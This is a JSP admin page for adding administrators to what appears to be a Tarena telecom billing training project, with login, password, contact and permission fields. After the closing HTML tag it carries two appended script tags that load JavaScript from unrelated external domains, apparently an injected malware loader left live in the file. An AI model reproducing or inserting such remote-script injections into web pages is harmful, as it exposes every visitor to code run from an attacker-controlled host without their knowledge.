<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<html>
<head>
<title> 管理员管理 </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center">

    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp">
        <td width="17%" height="6"> <span class="yellow">增加管理员</span></td>
        <td width="15%"> <a href="listManager.htm" class="text_link">管理员列表</a></td>
        <td width="17%"><span class="yellow"><a href="self.htm" class="text_link">
          私人信息</a></span></td>
      </tr>
    </table>

  <form name="adminForm" method="post" action="listManager.htm">
    <p class="pp" align='center'>请添加管理员信息</p>
    
    <table width="91%" border=1 bordercolor="ccccff" bgcolor="ccddee" class="9P">
      <tr>
        <td> 帐号<span class="pp">*</span></td>
        <td width="32%"><input type="text" name="loginName" value=""></td>
        <td width="48%">请输入管理员帐号（只限字母，数字，下划线）</td>
      </tr>
      <tr>
        <td width="20%">登陆密码<span class="pp">*</span></td>
        <td><input type="password" name="loginPassword" value=""></td>
        <td>请输入管理员的登陆密码（只限字母，数字，特殊符号）</td>
      </tr>
      <tr>
        <td>重复密码<span class="pp">*</span> </td>
        <td><input name="textfield3" type="password"></td>
        <td>请重复输入以上管理员密码</td>
      </tr>
      <tr>
        <td>真实姓名<span class="pp">*</span></td>
        <td><input type="text" name="name" value=""></td>
        <td>请输入管理员的真实姓名</td>
      </tr>
      <tr>
        <td>管理员邮箱<span class="pp">*</span> </td>
        <td><input type="text" name="email" value=""></td>
        <td>请输入管理员邮箱</td>
      </tr>
      <tr>
        <td>联系电话 </td>
        <td><input type="text" name="phone" value=""></td>
        <td>请输入管理员联系电话</td>
      </tr>
      <tr>
        <td>登陆权限<span class="pp">*</span> </td>
        <td></td>
        <td>请选择管理员的操作权限</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;<input type="checkbox" name="modules" value="1">&nbsp;
          管理员管理</td>
        <td>&nbsp;</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;<input type="checkbox" name="modules" value="2">&nbsp;
          资费管理</td>
        <td>&nbsp;</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;<input type="checkbox" name="modules" value="3">&nbsp;
          用户管理</td>
        <td>&nbsp;</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;<input type="checkbox" name="modules" value="4">&nbsp;
          账务查询</td>
        <td>&nbsp;</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;<input type="checkbox" name="modules" value="5">&nbsp;
          账单查询</td>
        <td>&nbsp;</td>
      </tr>
      
      <tr>
        <td>&nbsp;</td>
        <td colspan="2"><div align="center">
            <input type="submit" name="Submit" value="提交">
          </div></td>
      </tr>
    </table>
    <p>&nbsp;</p>
  </form>
  <p>&nbsp;</p>
</div>
<center>
  <p class="9P">&nbsp; </p>
  <hr/>
  <p class="text_link"><font size="2" face="宋体">About Tarena - 公司简介 - 联系方法 - 相关法律
    - 客户服务 <br>
    达内公司版权所有</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000.
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>

<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>